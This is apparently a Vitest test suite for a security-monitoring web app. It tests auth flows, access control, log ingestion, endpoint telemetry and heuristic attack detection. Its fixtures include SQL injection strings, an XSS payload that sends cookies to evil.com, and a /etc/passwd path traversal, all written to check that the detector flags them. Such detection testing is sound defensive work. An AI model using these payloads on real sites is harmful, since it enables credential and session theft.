import { beforeEach, describe, expect, it } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";
import * as db from "./db";
import { COOKIE_NAME, REFRESH_COOKIE_NAME } from "../shared/const";
import { createSessionToken, verifySession } from "./_core/session";
import { hashPassword } from "./_core/password";
import { clearAllRateLimits } from "./_core/rateLimit";
import {
  analyzeEndpointTelemetry,
  analyzeWithHeuristics,
  calculateEndpointRiskScore,
  validateEndpointTelemetry,
} from "./services/securityEngine";

function createMockContext(user: TrpcContext["user"] = null) {
  const cookieJar: Record<string, { value: string; options: Record<string, unknown> }> = {};
  const clearedCookies: string[] = [];

  const ctx: TrpcContext = {
    user,
    req: {
      protocol: "https",
      headers: {},
      ip: "127.0.0.1",
    } as unknown as TrpcContext["req"],
    res: {
      cookie: (name: string, value: string, options: Record<string, unknown>) => {
        cookieJar[name] = { value, options };
      },
      clearCookie: (name: string) => {
        clearedCookies.push(name);
        delete cookieJar[name];
      },
    } as unknown as TrpcContext["res"],
  };

  return { ctx, cookieJar, clearedCookies };
}

describe("COMPREHENSIVE TEST SUITE: CyberGuard AI", () => {
  beforeEach(() => {
    clearAllRateLimits();
  });
  /* =========================================================
     1. AUTHENTICATION & SESSION MANAGEMENT
     ========================================================= */
  describe("Authentication & Session Management", () => {
    it("enforces strong password validation on sign-up (< 8 characters rejected)", async () => {
      const { ctx } = createMockContext();
      const caller = appRouter.createCaller(ctx);

      await expect(
        caller.auth.signup({
          email: "weakpass@cyberguard.test",
          password: "short",
          name: "Test User",
        })
      ).rejects.toThrow();
    });

    it("rejects invalid email formats during sign-up", async () => {
      const { ctx } = createMockContext();
      const caller = appRouter.createCaller(ctx);

      await expect(
        caller.auth.signup({
          email: "not-an-email",
          password: "SecurePassword123!",
          name: "Test User",
        })
      ).rejects.toThrow();
    });

    it("successfully creates a new account and sets auth & refresh cookies", async () => {
      const { ctx, cookieJar } = createMockContext();
      const caller = appRouter.createCaller(ctx);
      const testEmail = `newuser_${Date.now()}@cyberguard.test`;

      const user = await caller.auth.signup({
        email: testEmail,
        password: "ValidPassword123!",
        name: "Security Analyst",
      });

      expect(user).toBeDefined();
      expect(user.openId).toBe(testEmail);
      expect(user.role).toBe("user");
      expect(user.organizationId).toBeDefined();
      expect(cookieJar[COOKIE_NAME]).toBeDefined();
      expect(cookieJar[REFRESH_COOKIE_NAME]).toBeDefined();

      const verified = await verifySession(cookieJar[COOKIE_NAME].value);
      expect(verified?.openId).toBe(testEmail);
    });

    it("rejects duplicate registration attempts with CONFLICT error", async () => {
      const { ctx } = createMockContext();
      const caller = appRouter.createCaller(ctx);
      const testEmail = `dup_${Date.now()}@cyberguard.test`;

      await caller.auth.signup({
        email: testEmail,
        password: "ValidPassword123!",
      });

      await expect(
        caller.auth.signup({
          email: testEmail,
          password: "ValidPassword123!",
        })
      ).rejects.toMatchObject({ code: "CONFLICT" });
    });

    it("authenticates registered user with correct password and rejects wrong password", async () => {
      const testEmail = `login_${Date.now()}@cyberguard.test`;
      const correctPassword = "CorrectPassword123!";

      const { ctx: signupCtx } = createMockContext();
      await appRouter.createCaller(signupCtx).auth.signup({
        email: testEmail,
        password: correctPassword,
      });

      // Wrong password
      const { ctx: wrongCtx } = createMockContext();
      await expect(
        appRouter.createCaller(wrongCtx).auth.login({
          email: testEmail,
          password: "WrongPassword!",
        })
      ).rejects.toMatchObject({ code: "UNAUTHORIZED" });

      // Correct password
      const { ctx: correctCtx, cookieJar } = createMockContext();
      const user = await appRouter.createCaller(correctCtx).auth.login({
        email: testEmail,
        password: correctPassword,
      });

      expect(user.openId).toBe(testEmail);
      expect(cookieJar[COOKIE_NAME]).toBeDefined();
    });

    it("rejects non-existent user login with UNAUTHORIZED", async () => {
      const { ctx } = createMockContext();
      await expect(
        appRouter.createCaller(ctx).auth.login({
          email: "ghost_user@nonexistent.domain",
          password: "AnyPassword123!",
        })
      ).rejects.toMatchObject({ code: "UNAUTHORIZED" });
    });

    it("clears both auth cookies upon logout", async () => {
      const testEmail = "logout_test@example.com";
      const { ctx, clearedCookies } = createMockContext({
        id: 99,
        openId: testEmail,
        email: testEmail,
        name: "Logout User",
        loginMethod: "password",
        passwordHash: null,
        role: "user",
        organizationId: 1,
        createdAt: new Date(),
        updatedAt: new Date(),
        lastSignedIn: new Date(),
      });

      const res = await appRouter.createCaller(ctx).auth.logout();
      expect(res.success).toBe(true);
      expect(clearedCookies).toContain(COOKIE_NAME);
      expect(clearedCookies).toContain(REFRESH_COOKIE_NAME);
    });

    it("executes OTP generation and verification flow", async () => {
      const { ctx } = createMockContext();
      const caller = appRouter.createCaller(ctx);
      const email = `otp_${Date.now()}@example.com`;

      const otpRes = await caller.auth.sendOtp({ email });
      expect(otpRes.success).toBe(true);
      expect(otpRes.otp).toBeDefined();

      // Verify with wrong OTP
      await expect(
        caller.auth.verifyOtp({ email, otp: "000000" })
      ).rejects.toMatchObject({ code: "BAD_REQUEST" });

      // Verify with generated OTP
      const verifyRes = await caller.auth.verifyOtp({ email, otp: otpRes.otp! });
      expect(verifyRes.success).toBe(true);
    });

    it("executes password reset flow and enforces single-use token", async () => {
      const email = `pwd_reset_${Date.now()}@example.com`;
      const { ctx: signupCtx } = createMockContext();
      await appRouter.createCaller(signupCtx).auth.signup({
        email,
        password: "OldPassword123!",
      });

      const { ctx: forgotCtx } = createMockContext();
      const forgotRes = await appRouter.createCaller(forgotCtx).auth.forgotPassword({ email });
      expect(forgotRes.success).toBe(true);
      expect(forgotRes.resetToken).toBeDefined();

      const { ctx: resetCtx } = createMockContext();
      const resetRes = await appRouter.createCaller(resetCtx).auth.resetPassword({
        email,
        token: forgotRes.resetToken!,
        password: "BrandNewPassword123!",
      });
      expect(resetRes.success).toBe(true);

      // Attempting to re-use the token must fail
      await expect(
        appRouter.createCaller(resetCtx).auth.resetPassword({
          email,
          token: forgotRes.resetToken!,
          password: "AnotherNewPassword123!",
        })
      ).rejects.toMatchObject({ code: "UNAUTHORIZED" });
    });
  });

  /* =========================================================
     2. ROLE-BASED ACCESS CONTROL (RBAC)
     ========================================================= */
  describe("Role-Based Authorization", () => {
    const regularUser = {
      id: 50,
      openId: "analyst@corp.local",
      email: "analyst@corp.local",
      name: "SOC Analyst",
      loginMethod: "password",
      passwordHash: null,
      role: "user" as const,
      organizationId: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };

    const adminUser = {
      id: 1,
      openId: "admin@corp.local",
      email: "admin@corp.local",
      name: "SOC Admin",
      loginMethod: "password",
      passwordHash: null,
      role: "admin" as const,
      organizationId: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };

    it("rejects regular user from adminProcedure endpoints", async () => {
      const { ctx } = createMockContext(regularUser);
      const caller = appRouter.createCaller(ctx);

      await expect(caller.threats.list({ limit: 10, offset: 0 })).rejects.toMatchObject({
        code: "FORBIDDEN",
      });
      await expect(caller.threats.getById({ id: 1 })).rejects.toMatchObject({
        code: "FORBIDDEN",
      });
      await expect(
        caller.logs.upload({
          sourceType: "firewall",
          logData: "2026-01-24 DROP 192.168.1.1 10.0.0.1",
        })
      ).rejects.toMatchObject({
        code: "FORBIDDEN",
      });
    });

    it("allows admin user to access adminProcedure endpoints", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const list = await caller.threats.list({ limit: 10, offset: 0 });
      expect(Array.isArray(list)).toBe(true);

      const metrics = await caller.dashboard.metrics();
      expect(metrics).toBeDefined();
      expect(typeof metrics.threatCount).toBe("number");
    });
  });

  /* =========================================================
     3. SECURITY LOGS & THREAT ANALYSIS PIPELINE
     ========================================================= */
  describe("Security Logs & Threat Analysis", () => {
    const adminUser = {
      id: 1,
      openId: "vasuvora88@gmail.com",
      email: "vasuvora88@gmail.com",
      name: "Admin",
      loginMethod: "password",
      passwordHash: null,
      role: "admin" as const,
      organizationId: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };

    it("uploads security logs and detects duplicate uploads", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const logPayload = `2026-09-27T10:00:00Z firewall: DENY TCP 198.51.100.2:4444 -> 10.0.0.5:22 tag=${Date.now()}`;

      const res1 = await caller.logs.upload({
        sourceType: "firewall",
        logData: logPayload,
      });

      expect(res1.success).toBe(true);
      expect(res1.logsCreated).toBe(1);

      // Duplicate upload
      const res2 = await caller.logs.upload({
        sourceType: "firewall",
        logData: logPayload,
      });

      expect(res2.duplicatesSkipped).toBe(1);
    });

    it("runs threat analysis and populates threat detections and incident recommendations", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const attackLog = `2026-09-27T10:05:00Z web_server: GET /login.php?user=admin' UNION SELECT 1,password,3 FROM users-- SourceIP=203.0.113.88 DestinationIP=10.0.0.10`;

      await caller.logs.upload({
        sourceType: "other",
        logData: attackLog,
      });

      const analysisRes = await caller.threats.analyze({ organizationId: 1 });
      expect(analysisRes.success).toBe(true);

      const threats = await caller.threats.list({ limit: 10, offset: 0 });
      expect(threats.length).toBeGreaterThan(0);

      const sqliThreat = threats.find((t) => t.threatType === "sql_injection");
      expect(sqliThreat).toBeDefined();

      if (sqliThreat) {
        // Recommendations check
        const rec = await caller.recommendations.getByThreatId({
          threatDetectionId: sqliThreat.id,
        });
        expect(rec).toBeDefined();
        expect(rec?.threatDetectionId).toBe(sqliThreat.id);
        expect(rec?.priority).toBeDefined();

        // Status update
        const updateRes = await caller.threats.updateStatus({
          id: sqliThreat.id,
          status: "investigating",
        });
        expect(updateRes.success).toBe(true);
      }
    });

    it("generates an official SOC Incident Dossier report from a threat detection", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const threats = await caller.threats.list({ limit: 5, offset: 0 });
      if (threats.length > 0) {
        const threatId = threats[0].id;
        const reportRes = await caller.reports.generate({
          threatDetectionId: threatId,
          reportType: "combined",
        });

        expect(reportRes.success).toBe(true);
        expect(reportRes.reportId).toBeDefined();

        const reportsList = await caller.reports.list({ limit: 10, offset: 0 });
        expect(reportsList.length).toBeGreaterThan(0);

        const fetched = await caller.reports.getById({ id: reportRes.reportId });
        expect(fetched).toBeDefined();
        expect(fetched?.threatDetectionId).toBe(threatId);
      }
    });
  });

  /* =========================================================
     4. ENDPOINT MONITORING & TELEMETRY
     ========================================================= */
  describe("Endpoint EDR & Telemetry", () => {
    const adminUser = {
      id: 1,
      openId: "vasuvora88@gmail.com",
      email: "vasuvora88@gmail.com",
      name: "Admin",
      loginMethod: "password",
      passwordHash: null,
      role: "admin" as const,
      organizationId: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };

    it("enrolls endpoint using enrollment token, then consumes token securely", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const created = await caller.endpoints.create({
        name: "TEST-EDR-WORKSTATION",
        hostname: "test-pc.corp.local",
        os: "Windows 11 Pro",
        agentVersion: "1.2.4",
      });

      expect(created.endpointId).toBeDefined();
      expect(created.token).toMatch(/^endpoint_/);

      // Public enrollment call using the token
      const enrolled = await caller.endpoints.enroll({
        token: created.token,
      });

      expect(enrolled.endpointId).toBe(created.endpointId);
      expect(enrolled.secret).toMatch(/^ep_/);

      // Attempting to re-enroll with the same token must fail
      await expect(
        caller.endpoints.enroll({
          token: created.token,
        })
      ).rejects.toMatchObject({ code: "UNAUTHORIZED" });
    });

    it("ingests, scores, and updates status on suspicious endpoint telemetry", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const endpoints = await caller.endpoints.list();
      expect(endpoints.length).toBeGreaterThan(0);
      const testEp = endpoints[0];

      const telemetryRes = await caller.endpoints.telemetry({
        endpointId: String(testEp.id),
        timestamp: new Date().toISOString(),
        eventType: "network_connection",
        source: { ip: "192.168.1.55", port: 51234 },
        destination: { ip: "185.220.101.5", port: 4444 },
        process: "powershell.exe",
        protocol: "TCP",
        flags: ["c2_beacon", "suspicious"],
      });

      expect(telemetryRes.success).toBe(true);
      expect(telemetryRes.riskScore).toBeGreaterThanOrEqual(60);

      // Isolate endpoint
      const isolateRes = await caller.endpoints.isolate({
        id: testEp.id,
        isolate: true,
      });
      expect(isolateRes.isolated).toBe(true);
      expect(isolateRes.status).toBe("warning");

      // Quick scan
      const scanRes = await caller.endpoints.quickScan({ id: testEp.id });
      expect(scanRes.success).toBe(true);
    });

    it("simulates endpoint telemetry profiles accurately", async () => {
      const { ctx } = createMockContext(adminUser);
      const caller = appRouter.createCaller(ctx);

      const endpoints = await caller.endpoints.list();
      const targetEp = endpoints[0];

      const sim = await caller.endpoints.simulateTelemetry({
        endpointId: targetEp.id,
        type: "suspicious_beacon",
      });

      expect(sim.success).toBe(true);
      expect(sim.riskScore).toBeGreaterThan(60);
      expect(["high", "critical"]).toContain(sim.severity);
    });
  });

  /* =========================================================
     5. SOC COPILOT CHAT & OFFLINE HEURISTICS
     ========================================================= */
  describe("SOC Copilot Chat", () => {
    const user = {
      id: 2,
      openId: "analyst@cyberguard.ai",
      email: "analyst@cyberguard.ai",
      name: "Analyst",
      loginMethod: "password",
      passwordHash: null,
      role: "user" as const,
      organizationId: 1,
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    };

    it("provides structured playbook responses for threat triage queries", async () => {
      const { ctx } = createMockContext(user);
      const caller = appRouter.createCaller(ctx);
      const sessionId = `test_session_${Date.now()}`;

      const chatRes = await caller.chat.message({
        sessionId,
        message: "How do I respond to a brute force attack?",
        organizationId: 1,
      });

      expect(chatRes.success).toBe(true);
      expect(chatRes.response).toContain("Brute Force");

      const history = await caller.chat.history({ sessionId, organizationId: 1 });
      expect(history.length).toBeGreaterThan(0);
      expect(history[0].userMessage).toBe("How do I respond to a brute force attack?");
    });

    it("detects and flags attack payloads pasted into chat directly", async () => {
      const { ctx } = createMockContext(user);
      const caller = appRouter.createCaller(ctx);
      const sessionId = `payload_session_${Date.now()}`;

      const chatRes = await caller.chat.message({
        sessionId,
        message: "Check this payload: ' UNION SELECT null, username, password FROM users--",
        organizationId: 1,
      });

      expect(chatRes.success).toBe(true);
      expect(chatRes.response.toLowerCase()).toContain("sql injection");
    });
  });

  /* =========================================================
     6. DEFENSIVE SECURITY & ATTACK CLASSIFICATION
     ========================================================= */
  describe("Security Engine Attack Signature Detection", () => {
    it("accurately classifies SQL Injection indicators", () => {
      const sqliLog = "SELECT * FROM users WHERE user = 'admin' OR 1=1--";
      const analysis = analyzeWithHeuristics(sqliLog);

      expect(analysis.riskScore).toBeGreaterThanOrEqual(40);
      expect(analysis.vulnerabilities.some((v) => v.toLowerCase().includes("sql"))).toBe(true);
    });

    it("accurately classifies XSS indicators", () => {
      const xssLog = "POST /comment text=<script>document.location='http://evil.com/steal?c='+document.cookie</script>";
      const analysis = analyzeWithHeuristics(xssLog);

      expect(analysis.riskScore).toBeGreaterThanOrEqual(40);
      expect(analysis.vulnerabilities.some((v) => v.toLowerCase().includes("cross-site"))).toBe(true);
    });

    it("accurately classifies Path Traversal indicators", () => {
      const traversalLog = "GET /download?file=../../../../etc/passwd HTTP/1.1";
      const analysis = analyzeWithHeuristics(traversalLog);

      expect(analysis.riskScore).toBeGreaterThanOrEqual(35);
      expect(analysis.vulnerabilities.some((v) => v.toLowerCase().includes("path traversal") || v.toLowerCase().includes("sensitive"))).toBe(true);
    });

    it("handles fuzzy / oversized inputs safely without crashing", () => {
      const hugeInput = "NORMAL_LOG ".repeat(5000) + "' OR 1=1--";
      const analysis = analyzeWithHeuristics(hugeInput);

      expect(analysis.riskScore).toBeGreaterThan(0);
      expect(analysis.vulnerabilities.length).toBeGreaterThan(0);
    });
  });
});
